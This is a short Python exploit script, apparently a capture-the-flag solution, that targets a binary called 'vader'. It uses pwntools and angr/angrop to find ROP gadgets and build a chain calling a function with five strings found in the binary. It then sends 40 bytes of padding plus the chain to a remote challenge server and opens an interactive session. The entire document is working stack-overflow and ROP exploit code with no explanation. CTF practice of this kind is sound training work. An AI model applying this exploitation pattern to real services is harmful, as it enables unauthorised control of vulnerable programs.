from pwn import *
import angr
import angrop
import logging

logging.getLogger('angr').setLevel(logging.WARNING)
logging.getLogger('angrop').setLevel(logging.WARNING)
logging.getLogger('os').setLevel(logging.WARNING)
logging.getLogger('pwnlib').setLevel(logging.WARNING)

e = ELF('./vader')
r = ROP(e)

dark = next(e.search(b'DARK\x00'))
side = next(e.search(b'S1D3\x00'))
of = next(e.search(b'OF\x00'))
the = next(e.search(b'TH3\x00'))
force = next(e.search(b'FORC3\x00'))

angr_p = angr.Project('./vader')
rop = angr_p.analyses.ROP()
rop.find_gadgets_single_threaded()

chain = rop.func_call("vader", [dark, side, of, the, force])
chain.print_payload_code()

#p = process('./vader')
p = remote('0.cloud.chals.io', 20712)
pad = b'A'*40
p.sendline(pad+chain.payload_str())
p.interactive()
